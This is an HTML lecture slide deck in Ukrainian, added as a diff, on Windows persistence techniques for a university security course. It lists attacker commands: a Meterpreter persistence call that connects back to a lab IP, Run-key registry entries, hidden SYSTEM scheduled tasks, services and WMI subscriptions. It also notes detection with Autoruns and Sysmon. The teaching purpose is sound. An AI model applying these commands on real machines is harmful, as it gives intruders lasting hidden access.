@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Тема 10.2 — Windows Persistence</title>
+  <link rel="icon" type="image/svg+xml" href="../../img/favicon.svg">
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../../css/slides.css">
+</head>
+<body data-lecture="10">
+  <div class="slide-deck">
+    <section class="slide active title-slide">
+      <h1>Windows Persistence</h1>
+      <div class="subtitle">Тема 10.2 — Утримання доступу та обхід антивірусів</div>
+      <p>Кафедра ТЕІБ, Ужгородський національний університет</p>
+    </section>
+
+    <section class="slide">
+      <h2>Registry Run Keys та Scheduled Tasks</h2>
+      <div class="two-column" style="margin-top:1rem;">
+        <div class="column">
+          <div class="card-red">
+            <h3>Registry Run Keys (T1547.001)</h3>
+            <div class="code-block" style="margin-top:0.8rem;font-size:0.68em;">
+# User-level
+HKCU\...\CurrentVersion\Run
+
+# System-level (admin)
+HKLM\...\CurrentVersion\Run
+
+# Meterpreter
+meterpreter&gt; run persistence
+  -U -i 30 -p 4444
+  -r 192.168.1.50
+
+# Ручне додавання
+reg add "HKCU\...\Run"
+  /v "Update" /t REG_SZ
+  /d "C:\Temp\update.exe"
+            </div>
+          </div>
+        </div>
+        <div class="column">
+          <div class="card-yellow">
+            <h3>Scheduled Tasks (T1053.005)</h3>
+            <div class="code-block" style="margin-top:0.8rem;font-size:0.68em;">
+# Кожні 5 хвилин
+schtasks /create
+  /tn "HealthCheck"
+  /tr "C:\Temp\health.exe"
+  /sc minute /mo 5
+  /ru SYSTEM
+
+# При логіні
+schtasks /create
+  /tn "UserSync"
+  /tr "powershell -w hidden
+    -f C:\Temp\sync.ps1"
+  /sc onlogon
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section class="slide">
+      <h2>Services та WMI Event Subscription</h2>
+      <div class="two-column" style="margin-top:1rem;">
+        <div class="column">
+          <div class="card-purple">
+            <h3>Windows Services (T1543.003)</h3>
+            <div class="code-block" style="margin-top:0.8rem;font-size:0.68em;">
+sc create "NetDiag"
+  binpath= "C:\Temp\svc.exe"
+  start= auto
+  obj= "LocalSystem"
+
+sc start NetDiag
+
+# Cleanup:
+sc stop NetDiag
+sc delete NetDiag
+            </div>
+            <p style="font-size:0.8em;margin-top:0.5rem;">Запускається при завантаженні ОС з правами SYSTEM</p>
+          </div>
+        </div>
+        <div class="column">
+          <div class="card-blue">
+            <h3>WMI Subscription (T1546.003)</h3>
+            <div class="code-block" style="margin-top:0.8rem;font-size:0.68em;">
+# PowerShell:
+# 1. EventFilter (тригер)
+# 2. CommandLineConsumer
+# 3. Binding
+
+# Meterpreter:
+run post/windows/manage/
+  wmi_persistence
+  PAYLOAD_PATH=C:\Temp\p.exe
+            </div>
+            <p style="font-size:0.8em;margin-top:0.5rem;">Найскладніший для виявлення. Event-based тригер.</p>
+          </div>
+        </div>
+      </div>
+      <div class="success-box" style="margin-top:1.5rem;">
+        <strong>Виявлення:</strong> Autoruns (Sysinternals) перевіряє усі точки автозапуску Windows. Sysmon логує process creation, registry changes, WMI events.
+      </div>
+    </section>
+  </div>
+  <div class="slide-counter" id="counter"></div>
+  <div class="slide-progress" id="progress"></div>
+  <div class="controls"><button id="btn-prev" onclick="prev()">&#8592;</button><button id="btn-next" onclick="next()">&#8594;</button></div>
+  <script src="../../js/slides.js"></script>
+</body>
+</html>
